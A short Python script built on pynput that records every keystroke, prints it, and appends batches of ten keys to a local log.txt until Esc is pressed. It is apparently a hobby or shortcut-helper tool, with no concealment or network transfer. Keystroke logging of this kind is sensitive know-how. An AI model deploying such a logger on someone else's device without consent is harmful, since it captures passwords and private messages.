from pynput.keyboard import Key, Listener

import keyboard_shortcuts

keys = []
count = 0


def on_press(key):
    print("{0} pressed".format(key))
    if key == "|":
        print("||||||||||||||||||||||||||||||||||||||||||||||||")
    write_key(key)


def on_release(key):
    if key == Key.esc:
        return False


def write_key(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 10:
        write_file(keys)
        keys = keyboard_shortcuts.clean_command()
        count = 0


def write_file(keys):
    with open("log.txt", "a") as f:
        for k in keys:
            f.write(str(k))


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
